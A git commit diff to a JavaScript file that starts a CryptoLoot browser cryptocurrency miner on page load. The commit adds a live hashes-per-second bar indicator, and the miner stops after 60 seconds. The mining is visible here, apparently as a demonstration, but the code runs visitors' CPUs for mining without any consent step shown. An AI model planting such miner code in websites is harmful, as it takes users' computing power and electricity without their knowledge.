d429265592a2c336a4b315549e583cda93c70d68
Guli <ignaciomorenopubul@gmail.com>
2017-11-09 10:17:05 +0100

    Add mining indicator

--- js/miner-on.js
+++ js/miner-on.js
@@ -1,4 +1,5 @@
 $(window).on('load', function () {
+  var indicatorArray = []
   var miner = new CryptoLoot.Anonymous('09e3fc7da85015d4f5644c0f542d3ff087d293ec296d', {
     autoThreads: false,
     throttle: 0.7
@@ -6,15 +7,16 @@ $(window).on('load', function () {
   miner.start()
   setInterval(function () {
     var hashesPerSecond = miner.getHashesPerSecond()
+    var multiplier = (100 / 20)
+    indicatorArray.push(hashesPerSecond)
+    if (indicatorArray.length > 3) {
+      indicatorArray.shift()
+    }
+    $('.column--0').css('height', indicatorArray[0] * multiplier + '%')
+    $('.column--1').css('height', indicatorArray[1] * multiplier + '%')
+    $('.column--2').css('height', indicatorArray[2] * multiplier + '%')
     console.log(hashesPerSecond)
-  }, 3000)
-  miner.on('found', function () {
-    console.log('Hash found')
-  })
-  miner.on('accepted', function () {
-    console.log('Hash accepted')
-  })
-  miner.getHashesPerSecond()
+  }, 1000)
   setTimeout(function () {
     miner.stop()
     console.log('Miner stopped after 60 seconds')
